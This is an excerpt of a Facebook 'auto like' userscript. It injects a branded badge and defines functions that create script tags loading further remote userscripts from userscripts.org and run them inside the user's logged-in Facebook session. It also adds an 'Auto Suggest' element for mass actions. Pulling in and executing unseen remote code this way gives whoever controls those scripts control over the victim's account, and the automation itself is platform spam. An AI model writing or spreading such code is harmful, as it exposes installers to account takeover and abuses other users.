...
// @namespace		        Facebook Auto Like Professional
// @description		        Like All Status, Comments, Photos
// @author			snifever
...
if(body != null) {
	...
	div.innerHTML = "<a style=\"font-weight:bold;color:#000000\" TARGET='_blank' href='https://www.facebook.com' title='AB-X'><img src='http://payload29.cargocollective.com/1/6/203816/2898863/like.png' height='15' width='137'></img></a>"
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="http://userscripts.org/scripts/source/159133.user.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="http://userscripts.org/scripts/source/159135.user.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by AB-X';
